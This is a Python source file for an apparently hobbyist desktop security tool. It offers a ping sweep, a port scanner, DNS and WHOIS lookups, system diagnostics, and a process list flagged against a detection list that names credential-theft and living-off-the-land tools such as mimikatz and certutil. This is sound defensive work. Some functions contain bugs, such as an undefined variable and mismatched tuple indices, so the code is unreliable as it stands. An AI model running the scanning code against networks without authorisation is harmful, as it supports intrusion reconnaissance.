import os
import platform
import ipaddress
import socket
import concurrent.futures
import subprocess
import dns.resolver
import whois
import psutil
import time
import requests
import hashlib
import winreg
import json
import re
import xml.etree.ElementTree as ET
import ipaddress
import colorama
import sys
import shutil
import glob
import random
import platform
import winreg
import pandas as pd
import numpy as np
import re
import webbrowser
import csv
import threading
import psutil
import smtplib
import ssl
import base64
import urllib.parse
import punycode
import itertools
import qrcode
import win32evtlog
import win32evtlogutil
from email.message import EmailMessage
from scapy.all import sniff, wrpcap, rdpcap, Ether, IP, TCP, UDP, ICMP, DNS, ARP, Raw, DNSQR
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from sklearn.ensemble import IsolationForest
from colorama import Fore, Style
from datetime import datetime, timedelta
from collections import defaultdict, Counter
from tqdm import tqdm
from dotenv import load_dotenv
from queue import Queue
from tabulate import tabulate

load_dotenv()

VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY")
#OPEN_HARDWARE_MONITOR_JSON = os.getenv("OPEN_HARDWARE_MONITOR_JSON")

if not VIRUSTOTAL_API_KEY:
    print("Missing Virustotal API Key. Ensure .env is configured correctly.")
    exit(1)

def safe_input(prompt=""):
    """ Handle input safely to prevent crashes in GUI mode """
    try:
        if sys.stdin and sys.stdin.isatty():  # Running in a normal terminal
            return input(prompt)
        else:  # Running in an environment where input() is unavailable (PyInstaller GUI mode)
            print(prompt + " [Skipping input in GUI mode]")
            return ""  # Provide a default value
    except KeyboardInterrupt:
        print("\n⚠️  User interrupted. Exiting gracefully...")
        sys.exit(0)  # Ensures Ctrl+C exits cleanly
 
def get_system_uptime(): # This function is used in sysinfo
    """Returns the system uptime in a human-readable format."""
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    uptime = datetime.now() - boot_time
    return str(uptime).split(".")[0]  # Remove microseconds

def clear_screen():
    """Clears the terminal screen for better readability."""
    os.system('cls' if platform.system().lower() == "windows" else 'clear')

###########################################################################
#                                                                         #
#                          NETWORK TOOLS MENU                             #
#                                                                         #
###########################################################################

def network_tools_menu():
    """Network Tools Menu"""
    while True:
        clear_screen()
        print("\n🌐 DeskSec - Network Tools")
        print("1  Ping Sweep")
        print("2  Port Scanner")
        print("3  Traceroute")
        print("4  DNS Lookup")
        print("5  WHOIS Lookup")
        print("6  Back to Main Menu")

        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            ping_sweep()
        elif choice == "2":
            port_scanner()
        elif choice == "3":
            traceroute()
        elif choice == "4":
            dns_lookup()
        elif choice == "5":
            whois_lookup()
        elif choice == "6":
            return  # Go back to the main menu
        else:
            print("❌ Invalid choice, please try again.")

def ping_host(ip):
    """Ping a single IP address to check if it's online."""
    param = "-n 1" if platform.system().lower() == "windows" else "-c 1"
    response = os.system(f"ping {param} -w 500 {ip} > nul 2>&1" if platform.system().lower() == "windows" else f"ping {param} -W 1 {ip} > /dev/null 2>&1")
    return ip if response == 0 else None

def ping_sweep():
    """Perform a ping sweep on a given subnet."""
    while True:
        subnet = input(f"\nEnter subnet (e.g., {default_network}) or '0' to go back: ")
        if subnet == "0":
            return
        
        try:
            network = ipaddress.ip_network(subnet, strict=False)
            print(f"\n🔎 Scanning subnet: {subnet}\n")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                live_hosts = list(filter(None, executor.map(ping_host, [str(ip) for ip in network.hosts()])))
            
            if live_hosts:
                print("✅ Live Hosts Found:")
                table = [[i + 1, ip] for i, ip in enumerate(live_hosts)]
                print(tabulate(table, headers=["#", "IP Address"], tablefmt="grid"))
            else:
                print("❌ No live hosts found on this subnet.")
        except ValueError:
            print("❌ Invalid subnet. Please enter a valid CIDR (e.g., 192.168.1.0/24).")

def scan_port(target_ip, port):
    """Attempts to connect to a given port on a target IP to check if it's open."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            return port if s.connect_ex((target_ip, port)) == 0 else None
    except:
        return None

def port_scanner():
    """Scans a range of ports on a target IP."""
    while True:
        target_ip = safe_input("\nEnter target IP or '0' to go back: ")
        if target_ip == "0":
            return
        
        mode = safe_input("Scan (1) Common Ports, (2) Custom Range, or '0' to go back: ")
        if mode == "0":
            return
        
        if mode == "1":
            ports = [22, 80, 443, 3389, 8080, 53, 445, 139]
        elif mode == "2":
            while True:
                port_range = safe_input("Enter port range (e.g., 1-1000) or '0' to go back: ")
                if port_range == "0":
                    return
                try:
                    start, end = map(int, port_range.split("-"))
                    ports = list(range(start, end + 1))
                    break
                except ValueError:
                    print("❌ Invalid range. Please enter in 'start-end' format (e.g., 1-1000).")
        else:
            print("❌ Invalid option.")
            continue

        print(f"\n🔍 Scanning {target_ip} for open ports...\n")

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            open_ports = list(filter(None, executor.map(lambda port: scan_port(target_ip, port), ports)))

        if open_ports:
            print("✅ Open Ports Found:")
            table = [[port, "Open"] for port in sorted(open_ports)]
            print(tabulate(table, headers=["Port", "Status"], tablefmt="grid"))
        else:
            print("❌ No open ports found.")

def traceroute():
    """Performs a traceroute to a given target IP or domain."""
    while True:
        target = safe_input("\nEnter target IP/Domain or '0' to go back: ")
        if target == "0":
            return
        
        print(f"\n🛣 Tracing route to {target}...\n")
        
        try:
            command = ["tracert", target] if platform.system().lower() == "windows" else ["traceroute", target]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.returncode == 0:
                print(result.stdout)
            else:
                print(f"❌ Error running traceroute: {result.stderr}")
        except Exception as e:
            print(f"❌ An error occurred: {e}")

def dns_lookup():
    while True:
        print("\n🌐 DNS Lookup")
        target = safe_input("Enter domain (or IP for reverse lookup, '0' to go back): ").strip()
        
        if target == "0":
            return  # Return to main menu

        try:
            # Forward lookup (domain -> IP)
            ip_addresses = socket.gethostbyname_ex(target)[2]
            print("\n✅ Forward Lookup Results:")
            for ip in ip_addresses:
                print(f" - {target} -> {ip}")
        
            # Reverse lookup (IP -> domain)
            try:
                hostnames = socket.gethostbyaddr(target)[0]
                print("\n✅ Reverse Lookup Results:")
                print(f" - {target} -> {hostnames}")
            except socket.herror:
                print("\n❌ No reverse DNS record found.")
        
            # Retrieve common DNS records (A, MX, TXT, CNAME)
            print("\n🔍 Retrieving DNS Records...")
            for record_type in ["A", "MX", "TXT", "CNAME"]:
                try:
                    answers = dns.resolver.resolve(target, record_type)
                    print(f"\n📌 {record_type} Records:")
                    for rdata in answers:
                        print(f" - {rdata}")
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.LifetimeTimeout):
                    print(f" - No {record_type} record found.")

        except socket.gaierror:
            print("❌ Invalid domain or IP address.")

def whois_lookup():
    """Perform a WHOIS lookup on a domain."""
    while True:
        domain = safe_input("Enter domain for WHOIS lookup ('0' to go back): ")
        if domain == "0":
            return
        try:
            print(f"🌐 Retrieving WHOIS information for {domain}...\n")
            w = whois.whois(domain)
            print("✅ WHOIS Lookup Results:")
            print(f" - Domain Name: {w.domain_name}")
            print(f" - Registrar: {w.registrar}")
            print(f" - Creation Date: {w.creation_date}")
            print(f" - Expiration Date: {w.expiration_date}")
            print(f" - Name Servers: {', '.join(w.name_servers)}")
        except Exception as e:
            print(f"❌ WHOIS lookup failed: {e}")

###########################################################################
#                                                                         #
#                       SYSTEM DIAGNOSTICS MENU                           #
#                                                                         #
###########################################################################

def system_diagnostics_menu():
    """System Diagnostics Menu (Upcoming)"""
    while True:
        clear_screen()
        print("\n🔧 DeskSec - System Diagnostics")
        print("1  System Information")
        print("2  Running Processes")
        print("3  Network Adapters")
        print("4  Disk Usage")
        print("5  Memory Usage")
        print("6  Installed Software")
        print("7  Network Shares")
        print("8  Group Policy (Windows Only)")
        print("9  CPU Usage Monitor")
        print("10 Real Time Process Monitor")
        print("11 Startup Programs (Windows Only)")
        print("12 System Event Logs (Windows Only)")
        print("13 Power and Battery Info (Windows Only)")
        print("14 CPU Temperature (Windows Only)")
        print("15 Back to Main Menu")

        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            sysinfo()
        elif choice == "2":
            list_running_processes()
        elif choice == "3":
            list_network_adapters()
        elif choice == "4":
            disk_usage()
        elif choice == "5":
            ram_usage()
        elif choice == "6":
            list_installed_software()
        elif choice == "7":
            get_network_shares()
        elif choice == "8":
            get_gpo_policies()
        elif choice == "9":
            monitor_cpu_usage()
        elif choice == "10":
            real_time_process_monitor()
        elif choice == "11":
            list_startup_programs()
        elif choice == "12":
            get_system_logs()
        elif choice == "13":
            get_power_info()
        elif choice == "14":
            get_cpu_temperature()
        elif choice == "15":
            return  # Go back to the main menu
        else:
            print("❌ This feature is not implemented yet.")

def sysinfo():
    """Displays system information."""
    clear_screen()
    print("\n🖥  System Information\n")
    print(f"OS: {platform.system()} {platform.release()} ({platform.version()})")
    print(f"Architecture: {platform.architecture()[0]}")
    print(f"Processor: {platform.processor()}")
    print(f"CPU Cores: {psutil.cpu_count(logical=False)} Physical, {psutil.cpu_count(logical=True)} Logical")
    print(f"Total RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB")
    print(f"Available RAM: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB")
    disk_usage = psutil.disk_usage('/')
    print(f"Disk Usage: {round(disk_usage.used / (1024 ** 3), 2)} GB used / {round(disk_usage.total / (1024 ** 3), 2)} GB total")
    uptime_seconds = round(psutil.boot_time())
    print(f"System Uptime: {get_system_uptime()}")
    safe_input("\nPress Enter to return to the menu...")

SUSPICIOUS_PROCESSES = {"powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "regsvr32.exe", 
                        "rundll32.exe", "mshta.exe", "schtasks.exe", "wmic.exe", "bitsadmin.exe",
                        "certutil.exe", "mimikatz.exe", "procdump.exe", "taskmgr.exe"}

def list_running_processes():
    """Displays running processes and allows manual VirusTotal scanning."""
    print("📋 Running Processes with Parent Process Info\n")

    process_list = []
    global process_mapping  # Ensure it's accessible in list_suspicious_processes
    process_mapping = {}

    for proc in psutil.process_iter(['pid', 'name', 'ppid', 'exe', 'cpu_percent']):
        try:
            exe_path = proc.info['exe'] if proc.info['exe'] else "N/A"
            parent_name = psutil.Process(proc.info['ppid']).name() if proc.info['ppid'] else "N/A"
            cpu_usage = proc.info['cpu_percent']
            is_suspicious = "⚠️" if proc.info['name'].lower() in SUSPICIOUS_PROCESSES else ""

            process_list.append((proc.info['pid'], proc.info['name'], parent_name, cpu_usage, is_suspicious))
            process_mapping[proc.info['pid']] = exe_path  # Store process executable path
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue  # Skip inaccessible processes

    if not process_list:
        print("❌ No running processes found.")
        return

    print(tabulate(process_list, headers=["PID", "Process", "Parent Process", "CPU (%)", "Flag"], tablefmt="grid"))

    while True:
        print("\n(1) Search for a Process  (2) Show High CPU Usage Processes  (3) Show Suspicious Processes (4) Scan Process on VirusTotal  (5) Return to Menu")
        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            search_process(process_list)
        elif choice == "2":
            show_high_cpu_usage(process_list)
        elif choice == "3":
            list_suspicious_processes(process_list)  # Pass process list to function
        elif choice == "4":
            pid_to_scan = safe_input("Enter PID to check on VirusTotal (or '99' to go back): ")
            if pid_to_scan == "99":
                continue
            try:
                pid_to_scan = int(pid_to_scan)
                if pid_to_scan in process_mapping:
                    exe_path = process_mapping[pid_to_scan]
                    if exe_path == "N/A":
                        print("❌ No valid executable path found for this process.")
                        continue
                    file_hash = get_file_hash(exe_path)
                    if file_hash:
                        print(f"🔍 Checking VirusTotal for {exe_path} (Hash: {file_hash})...")
                        vt_result = check_hash_virustotal(file_hash)
                        if vt_result is None:
                            print("❌ No results found on VirusTotal.")
                        elif vt_result > 0:
                            print(f"⚠️ Warning! {vt_result} engines flagged this file as malicious.")
                        else:
                            print("✅ No detections found on VirusTotal.")
                else:
                    print("❌ Invalid PID entered.")
            except ValueError:
                print("❌ Please enter a valid numeric PID.")
        elif choice == "5":
            return
        else:
            print("❌ Invalid option, try again.")

def search_process(process_list):
    """Searches for a specific process by name."""
    keyword = safe_input("Enter process name (or part of it) to search: ").strip().lower()
    matches = [p for p in process_list if keyword in p[1].lower()]

    if matches:
        print("\n🔎 Matching Processes:")
        print(tabulate(matches, headers=["PID", "Process", "Parent PID", "Parent Process", "CPU Usage (%)", "Malware?"], tablefmt="grid"))
    else:
        print("❌ No matching processes found.")
    
    safe_input("\nPress Enter to return...")

def show_high_cpu_usage(process_list):
    """Displays processes consuming high CPU."""
    threshold = 10  # Set threshold (adjustable)
    high_cpu_processes = [p for p in process_list if p[4] > threshold]

    if high_cpu_processes:
        print("\n🔥 High CPU Usage Processes:")
        print(tabulate(high_cpu_processes, headers=["PID", "Process", "Parent PID", "Parent Process", "CPU Usage (%)", "Malware?"], tablefmt="grid"))
    else:
        print("✅ No high CPU usage detected.")
    
    safe_input("\nPress Enter to return...")

def terminate_process():
    """Terminate a process by PID."""
    pid = safe_input("\nEnter PID to terminate (or '0' to go back): ").strip()
    
    if pid == "0":
        return
    
    if not pid.isdigit():
        print("❌ Invalid PID.")
        return
    
    pid = int(pid)
    try:
        proc = psutil.Process(pid)
        proc.terminate()
        print(f"✅ Successfully terminated process {pid} ({proc.name()})")
    except psutil.NoSuchProcess:
        print("❌ Process not found.")
    except psutil.AccessDenied:
        print("❌ Permission denied. Try running as administrator.")
    
    safe_input("\nPress Enter to return...")

def list_suspicious_processes(process_list):
    """Filters and displays only suspicious processes."""
    suspicious_procs = [p for p in process_list if p[4] == "⚠️"]  # Column index for 'Malware?'

    if suspicious_procs:
        print("\n⚠️ Suspicious Processes Found:")
        print(tabulate(suspicious_procs, headers=["PID", "Process", "Parent Process", "CPU Usage (%)", "Malware?"], tablefmt="grid"))

        while True:
            choice = safe_input("\n(1) Upload to VirusTotal  (2) Return: ")
            if choice == "1":
                for proc in suspicious_procs:
                    pid = proc[0]  # Extract PID
                    exe_path = process_mapping.get(pid, "N/A")  # Get file path
                    if exe_path == "N/A":
                        print(f"❌ No valid executable path found for PID {pid}. Skipping...")
                        continue
                    file_hash = get_file_hash(exe_path)
                    if file_hash:
                        print(f"🔍 Checking VirusTotal for {exe_path} (Hash: {file_hash})...")
                        vt_result = check_hash_virustotal(file_hash)
                        if vt_result is None:
                            print("❌ No results found on VirusTotal.")
                        elif vt_result > 0:
                            print(f"⚠️ Warning! {vt_result} engines flagged this file as malicious.")
                        else:
                            print("✅ No detections found on VirusTotal.")
            elif choice == "2":
                return
            else:
                print("❌ Invalid option, try again.")
    else:
        print("✅ No suspicious processes detected.")

    safe_input("\nPress Enter to return...")

def get_file_hash(file_path):
    """Generate SHA256 hash of a file."""
    try:
        with open(file_path, "rb") as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        return file_hash
    except Exception as e:
        print(f"❌ Unable to hash {file_path}: {e}")
        return None

def check_hash_virustotal(file_hash):
    """Check a file hash against VirusTotal's database."""
    url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
    headers = {
        "x-apikey": VIRUSTOTAL_API_KEY,
        "accept": "application/json"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
        malicious_count = stats.get("malicious", 0)
        return malicious_count
    elif response.status_code == 404:
        return None  # Hash not found in VirusTotal database
    else:
        print(f"❌ VirusTotal API error: {response.status_code} - {response.text}")
        return None

def hash_lookup_virustotal(suspicious_procs):
    """Generate hashes and check VirusTotal for malware detection."""
    headers = ["PID", "Process", "Parent Process", "SHA256 Hash", "Malicious Detections"]
    results = []

    for pid, proc_name, _, parent_name, _, _ in suspicious_procs:
        try:
            proc = psutil.Process(pid)
            exe_path = proc.exe()  # Get full path of executable

            if os.path.exists(exe_path):
                file_hash = get_file_hash(exe_path)

                if file_hash:
                    print(f"[🔍] Checking {proc_name} (PID {pid}) on VirusTotal...")
                    malicious_count = check_hash_virustotal(file_hash)
                    
                    if malicious_count is not None:
                        results.append([pid, proc_name, parent_name, file_hash, malicious_count])
                    else:
                        results.append([pid, proc_name, parent_name, file_hash, "Not Found"])
                    
                    time.sleep(15)  # Avoid rate limit

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            print(f"❌ Could not access {proc_name} (PID {pid}).")

    if results:
        print("\n✅ VirusTotal Scan Results:")
        print(tabulate(results, headers=headers, tablefmt="grid"))
    else:
        print("✅ No results found.")

    safe_input("\nPress Enter to return...")

def list_network_adapters():
    """Displays network adapter details."""
    clear_screen()
    print("🌐 Network Adapters\n")

    adapters = []
    interfaces = psutil.net_if_addrs()
    stats = psutil.net_if_stats()

    for adapter, addresses in interfaces.items():
        mac_address = "N/A"
        ipv4_address = "N/A"
        ipv6_address = "N/A"
        mtu = "N/A"
        status = "Down"
        speed = "N/A"

        for addr in addresses:
            if addr.family == socket.AF_LINK:
                mac_address = addr.address
            elif addr.family == socket.AF_INET:
                ipv4_address = addr.address
            elif addr.family == socket.AF_INET6:
                ipv6_address = addr.address.split('%')[0]  # Remove interface index from IPv6

        if adapter in stats:
            mtu = stats[adapter].mtu
            status = "Up" if stats[adapter].isup else "Down"
            speed = stats[adapter].speed if stats[adapter].speed else "Unknown"

        adapters.append((adapter, ipv4_address, ipv6_address, mac_address, mtu, status, speed))

    if adapters:
        print(tabulate(adapters, headers=["Adapter", "IPv4", "IPv6", "MAC Address", "MTU", "Status", "Speed (Mbps)"], tablefmt="grid"))
    else:
        print("❌ No network adapters found.")

    safe_input("\nPress Enter to return...")

def disk_usage():
    """Displays disk usage information for all mounted partitions."""
    clear_screen()
    print("💾 Disk Usage\n")

    partitions = psutil.disk_partitions()
    disk_info = []

    for partition in partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            total = usage.total / (1024**3)  # Convert bytes to GB
            used = usage.used / (1024**3)
            free = usage.free / (1024**3)
            percent = usage.percent

            disk_info.append((partition.device, partition.mountpoint, f"{total:.2f} GB", f"{used:.2f} GB", f"{free:.2f} GB", f"{percent}%"))

        except PermissionError:
            # Skip partitions that require admin access
            continue

    if disk_info:
        print(tabulate(disk_info, headers=["Device", "Mountpoint", "Total", "Used", "Free", "Usage (%)"], tablefmt="grid"))
    else:
        print("❌ No accessible disk partitions found.")

    safe_input("\nPress Enter to return...")

def ram_usage():
    """Displays system RAM, swap memory usage, and gives the option to list running processes."""
    clear_screen()
    print("🧠 RAM & Swap Memory Usage\n")

    # Get RAM details
    ram = psutil.virtual_memory()
    total_ram = ram.total / (1024 ** 3)
    available_ram = ram.available / (1024 ** 3)
    used_ram = ram.used / (1024 ** 3)
    ram_percent = ram.percent

    # Get Swap (Pagefile) details
    swap = psutil.swap_memory()
    total_swap = swap.total / (1024 ** 3)
    used_swap = swap.used / (1024 ** 3)
    free_swap = swap.free / (1024 ** 3)
    swap_percent = swap.percent

    # RAM Table
    ram_info = [
        ("Total RAM", f"{total_ram:.2f} GB"),
        ("Available RAM", f"{available_ram:.2f} GB"),
        ("Used RAM", f"{used_ram:.2f} GB"),
        ("RAM Usage (%)", f"{ram_percent}%")
    ]

    # Swap (Pagefile) Table
    swap_info = [
        ("Total Swap", f"{total_swap:.2f} GB"),
        ("Used Swap", f"{used_swap:.2f} GB"),
        ("Free Swap", f"{free_swap:.2f} GB"),
        ("Swap Usage (%)", f"{swap_percent}%")
    ]

    print("💾 RAM Usage:\n")
    print(tabulate(ram_info, tablefmt="grid"))

    print("\n📄 Swap (Pagefile) Usage:\n")
    print(tabulate(swap_info, tablefmt="grid"))

    # New Option: Check running processes
    while True:
        choice = safe_input("\n(1) View Running Processes (2) Return to Main Menu: ")
        if choice == "1":
            list_running_processes()
        elif choice == "2":
            return
        else:
            print("❌ Invalid option, try again.")

def get_installed_software_windows():
    """Retrieves a list of installed software from the Windows Registry."""
    software_list = []
    registry_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"  # 32-bit apps on 64-bit Windows
    ]
    
    for reg_path in registry_paths:
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as reg_key:
                for i in range(winreg.QueryInfoKey(reg_key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(reg_key, i)
                        with winreg.OpenKey(reg_key, subkey_name) as subkey:
                            name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                            version, _ = winreg.QueryValueEx(subkey, "DisplayVersion") if "DisplayVersion" in [winreg.EnumValue(subkey, j)[0] for j in range(winreg.QueryInfoKey(subkey)[1])] else ("Unknown", None)
                            software_list.append((name, version))
                    except OSError:
                        continue
        except OSError:
            continue

    return software_list

def get_installed_software_linux():
    """Retrieves a list of installed software on Linux systems."""
    try:
        if os.path.exists('/usr/bin/dpkg'):
            result = subprocess.run(['dpkg', '-l'], stdout=subprocess.PIPE, text=True)
            lines = result.stdout.split("\n")[5:]
            return [(line.split()[1], line.split()[2]) for line in lines if len(line.split()) >= 3]
        elif os.path.exists('/bin/rpm'):
            result = subprocess.run(['rpm', '-qa'], stdout=subprocess.PIPE, text=True)
            return [(line, "Unknown") for line in result.stdout.split("\n") if line]
    except Exception as e:
        print(f"❌ Error retrieving installed software: {e}")
    
    return []

def get_installed_software_mac():
    """Retrieves a list of installed software on macOS systems."""
    try:
        result = subprocess.run(['brew', 'list', '--versions'], stdout=subprocess.PIPE, text=True)
        return [tuple(line.split()) for line in result.stdout.split("\n") if line]
    except Exception as e:
        print(f"❌ Error retrieving installed software: {e}")

    return []

def list_installed_software():
    """Displays installed software on the system."""
    clear_screen()
    print("📦 Installed Software\n")

    system = platform.system().lower()
    if "windows" in system:
        software_list = get_installed_software_windows()
    elif "linux" in system:
        software_list = get_installed_software_linux()
    elif "darwin" in system:  # macOS
        software_list = get_installed_software_mac()
    else:
        print("❌ Unsupported OS.")
        return

    if not software_list:
        print("❌ No installed software found or unable to retrieve the list.")
        return

    print(tabulate(software_list, headers=["Software", "Version"], tablefmt="grid"))

    while True:
        print("\n(1) Search for Software  (2) Export to File  (3) Return")
        choice = safe_input("Select an option: ")

        if choice == "1":
            search_software(software_list)
        elif choice == "2":
            export_software_list(software_list)
        elif choice == "3":
            return
        else:
            print("❌ Invalid option, try again.")

def search_software(software_list):
    """Allows searching for a specific installed software."""
    search_query = safe_input("Enter software name to search: ").lower()
    results = [s for s in software_list if search_query in s[0].lower()]

    if results:
        print("\n🔍 Search Results:")
        print(tabulate(results, headers=["Software", "Version"], tablefmt="grid"))
    else:
        print("❌ No matching software found.")

def export_software_list(software_list):
    """Exports the installed software list to a file."""
    filename = "installed_software.txt"
    with open(filename, "w") as f:
        for name, version in software_list:
            f.write(f"{name} - {version}\n")

    print(f"📂 Software list exported to {filename}")

def get_network_shares():
    """Retrieves network shares the PC is currently connected to."""
    clear_screen()
    print("🌐 Connected Network Shares\n")

    system = platform.system().lower()
    shares = []

    if "windows" in system:
        try:
            result = subprocess.run(["net", "use"], capture_output=True, text=True, shell=True)
            lines = result.stdout.split("\n")

            for line in lines:
                parts = line.strip().split()
                if len(parts) >= 2 and parts[0].startswith("\\\\"):
                    shares.append((parts[0], parts[-1] if parts[-1] != "OK" else "Connected"))

        except Exception as e:
            print(f"❌ Error retrieving network shares: {e}")

    elif "linux" in system or "darwin" in system:  # macOS
        try:
            result = subprocess.run(["mount"], capture_output=True, text=True)
            lines = result.stdout.split("\n")

            for line in lines:
                if "cifs" in line or "smbfs" in line:  # Look for SMB shares
                    parts = line.split()
                    shares.append((parts[0], parts[2]))

        except Exception as e:
            print(f"❌ Error retrieving network shares: {e}")

    if shares:
        print(tabulate(shares, headers=["Network Share", "Status"], tablefmt="grid"))
    else:
        print("❌ No network shares detected.")

    safe_input("\nPress Enter to return...")

def get_gpo_policies():
    """Retrieves applied Group Policy settings on Windows."""
    clear_screen()
    print("🏛 Applied Group Policy (GPO) Settings\n")

    if platform.system().lower() != "windows":
        print("❌ GPO policies are only available on Windows.")
        return

    try:
        result = subprocess.run(["gpresult", "/z"], capture_output=True, text=True, shell=True)
        output_lines = result.stdout.split("\n")

        policies = []
        capturing = False

        for line in output_lines:
            if "Applied Group Policy Objects" in line:
                capturing = True
            if capturing and line.strip():
                policies.append(line.strip())

        if policies:
            print("\n".join(policies))
        else:
            print("❌ No applied GPO policies found.")

    except Exception as e:
        print(f"❌ Error retrieving GPO policies: {e}")

    safe_input("\nPress Enter to return...")

def monitor_cpu_usage():
    """Monitors CPU usage in real-time."""
    clear_screen()
    print("🖥 Real-Time CPU Usage Monitor (Press Ctrl+C to stop)\n")

    try:
        while True:
            usage_per_core = psutil.cpu_percent(percpu=True)
            total_usage = psutil.cpu_percent()
            print(f"Total CPU Usage: {total_usage}%")
            for i, core in enumerate(usage_per_core):
                print(f"  Core {i}: {core}%")
            time.sleep(2)
            clear_screen()
    except KeyboardInterrupt:
        print("\n✔ Exiting CPU Usage Monitor.")
        time.sleep(2)

def real_time_process_monitor():
    """Continuously monitors running processes for high CPU/memory usage."""
    clear_screen()
    print("📡 Real-Time Process Monitor (Press Ctrl+C to stop)\n")

    try:
        while True:
            processes = sorted(psutil.process_iter(attrs=['pid', 'name', 'cpu_percent', 'memory_percent']),
                               key=lambda p: p.info['cpu_percent'], reverse=True)[:10]

            print(tabulate([(p.info['pid'], p.info['name'], f"{p.info['cpu_percent']}%", f"{p.info['memory_percent']}%")
                            for p in processes],
                           headers=["PID", "Process", "CPU (%)", "Memory (%)"],
                           tablefmt="grid"))

            time.sleep(5)
            clear_screen()
    except KeyboardInterrupt:
        print("\n[✔] Exiting Process Monitor.")
        time.sleep(2)

def list_startup_programs():
    """Lists programs set to run at startup (Windows-only)."""
    clear_screen()
    print("🚀 Startup Programs\n")

    if platform.system().lower() != "windows":
        print("❌ This feature is only available on Windows.")
        return

    try:
        result = subprocess.run(["wmic", "startup", "get", "Caption,Command"], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"❌ Error retrieving startup programs: {e}")

    safe_input("\nPress Enter to return...")

def get_system_logs():
    """Retrieves the latest system event logs."""
    clear_screen()
    print("📜 Retrieving System Event Logs...\n")

    if platform.system().lower() != "windows":
        print("❌ System logs feature is only available on Windows.")
        return

    try:
        result = subprocess.run(["wevtutil", "qe", "System", "/c:10", "/rd:true", "/f:text"], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"❌ Error retrieving logs: {e}")

    safe_input("\nPress Enter to return...")

def get_power_info():
    """Retrieves power and battery status (Windows-only)."""
    clear_screen()
    print("⚡ Power & Battery Information\n")

    if platform.system().lower() != "windows":
        print("❌ This feature is only available on Windows.")
        return

    try:
        result = subprocess.run(["powercfg", "/batteryreport"], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"❌ Error retrieving power status: {e}")

    safe_input("\nPress Enter to return...")

OHM_URL = "http://localhost:8085/data.json"  # OHM API endpoint
OHM_EXE_PATH = "C:\\Program Files (x86)\\OpenHardwareMonitor\\OpenHardwareMonitor.exe"  # Default installation path

def is_ohm_running():
    """Check if OpenHardwareMonitor is running."""
    try:
        response = requests.get(OHM_URL, timeout=2)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def start_ohm():
    """Attempt to start OpenHardwareMonitor if found."""
    if os.path.exists(OHM_EXE_PATH):
        print("🔄 OpenHardwareMonitor not running. Attempting to start it...")
        os.startfile(OHM_EXE_PATH)
        time.sleep(5)  # Give it time to start
        return is_ohm_running()
    return False

def extract_cpu_temperature(sensor_data):
    """Recursively searches for CPU temperature values in OpenHardwareMonitor JSON data."""
    if isinstance(sensor_data, dict):
        if sensor_data.get("Text", "").lower() == "temperatures":
            temperatures = []
            for child in sensor_data.get("Children", []):
                if "Value" in child and "°C" in child["Value"]:
                    temp_value = float(child["Value"].replace("°C", "").strip())
                    temperatures.append(temp_value)
            return max(temperatures) if temperatures else None

        for child in sensor_data.get("Children", []):
            temp = extract_cpu_temperature(child)
            if temp:
                return temp

    elif isinstance(sensor_data, list):
        for item in sensor_data:
            temp = extract_cpu_temperature(item)
            if temp:
                return temp

    return None

def get_cpu_temperature():
    """Fetches CPU temperature, ensuring OpenHardwareMonitor is running."""
    print("🔥 CPU Temperature\n")

    if not is_ohm_running():
        if not start_ohm():
            print("❌ OpenHardwareMonitor is not running and couldn't be started.")
            print("➡ Please install it from: https://openhardwaremonitor.org/")
            print("⚙ Then enable remote monitoring (Options > Remote Web Server).")
            safe_input("\nPress Enter to return...")
            return

    try:
        response = requests.get(OHM_URL)
        response.raise_for_status()
        data = response.json()

        cpu_temp = extract_cpu_temperature(data)

        if cpu_temp is not None:
            print(f"🌡 CPU Temperature: {cpu_temp}°C")
        else:
            print("[❌] Could not find CPU temperature data.")

    except requests.exceptions.RequestException as e:
        print(f"❌ Error retrieving data: {e}")
    except json.JSONDecodeError:
        print("❌ Failed to decode JSON. Ensure OpenHardwareMonitor remote monitoring is enabled.")

    safe_input("\nPress Enter to return...")

###########################################################################
#                                                                         #
#                      SECURITY LOG ANALYSIS MENU                         #
#                                                                         #
###########################################################################

def security_log_analysis_menu():
    """Security & Log Analysis Menu (Upcoming)"""
    while True:
        clear_screen()
        print("\n🛡  DeskSec - Security & Log Analysis")
        print("1  Sysmon Log Monitoring") 
        print("2  Windows Event Log Analysis") # putting this on the back burner for now.
        print("3  File Integrity Check")
        print("4  Active Directory Audit")
        print("5  Failed Login Attempts Review")
        print("6  Registry Anomaly Detector")
        print("7  Back to Main Menu")

        choice = safe_input("\nSelect an option: ")

        if choice == "1":
            # 🛠️ Ask for optional filtering inputs
            event_id = safe_input("🔎 Filter by Event ID (or press Enter to skip): ").strip() or None
